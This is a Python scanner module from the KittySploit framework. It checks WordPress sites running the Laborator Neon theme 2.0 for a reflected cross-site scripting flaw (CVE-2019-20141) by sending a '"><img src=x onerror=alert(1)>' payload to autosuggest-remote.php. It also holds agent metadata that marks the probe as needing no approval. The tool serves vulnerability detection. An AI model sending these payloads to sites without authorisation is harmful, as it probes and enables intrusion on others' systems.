#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""WordPress Laborator Neon theme 2."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'WordPress Laborator Neon Theme 2.0 - Cross-Site Scripting Detection',
        'description': 'WordPress Laborator Neon theme 2.0 contains a cross-site scripting vulnerability via the data/autosuggest-remote.php q parameter.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2019', 'xss', 'laborator', 'wordpress', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://knassar7o2.blogspot.com/2019/12/neon-dashboard-cve-2019-20141.html',
            'https://knassar7o2.blogspot.com/2019/12/neon-dashboard-xss-reflected.html',
            'https://knassar702.github.io/cve/neon/',
            'https://nvd.nist.gov/vuln/detail/CVE-2019-20141',
            'https://github.com/ARPSyndicate/kenzer-templates',
        ],
        'cve': 'CVE-2019-20141',
    }

    def run(self):
        for path in ('/data/autosuggest-remote.php?q="><img%20src=x%20onerror=alert(1)>', '/admin/data/autosuggest-remote.php?q="><img%20src=x%20onerror=alert(1)>'):
            r = self.http_request(method="GET", path=path, allow_redirects=False)
            if not r or r.status_code != 200:
                continue
            body = r.text or ""
            headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
            body_any = ('><img src=x onerror=alert(1)>>)1(trela=rorreno',)
            header_any = ('text/html',)
            if (any(m in body for m in body_any)) and (any(m in headers for m in header_any)):
                self.set_info(
                    severity='medium',
                    reason="WordPress Laborator Neon Theme 2.0 - Cross-Site Scripting detected",
                    path=path,
                )
                return True
        return False

